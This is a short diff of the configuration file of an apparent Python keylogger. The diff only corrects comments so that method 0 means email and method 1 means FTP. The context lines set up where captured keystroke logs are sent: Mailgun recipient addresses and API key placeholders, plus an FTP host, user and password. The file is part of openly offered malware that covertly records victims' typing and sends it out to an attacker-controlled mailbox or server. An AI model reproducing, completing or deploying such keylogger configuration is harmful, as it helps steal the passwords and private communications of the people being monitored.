@@ -6,12 +6,12 @@ import Logger
 METHOD = 0				# This defines the method the keylogger will send the logs
 					# Use 0 for sending an email and 1 for uploading to ftp
 
-# If you are using 1 as method ( EMAIL ) and ignore the FTP part
+# If you are using 0 as method ( EMAIL ) and ignore the FTP part
 RECIPIENT_EMAILS = ["recipient@*.*"] # Must be authorized by you on mailgun (Manage Authorized recipients on the control panel)
 MAILGUN_API_KEY = "key-XXXXXXXXXXXXXXXXXXXXXXXXXXX" # Get it on http://www.mailgun.com/
 MAILGUN_DOMAIN_NAME = "sandboxXXXXXXXXXXXXXXXXXXXXXXXX.mailgun.org" # Get it on http://www.mailgun.com/
 
-# If you are using 0 as method ( FTP ) and ignore the EMAIL part
+# If you are using 1 as method ( FTP ) and ignore the EMAIL part
 FTPHOST = "ftp.yourhost.com"
 FTPUSER = "ftpuser"
 FTPPASS = "ftppass"
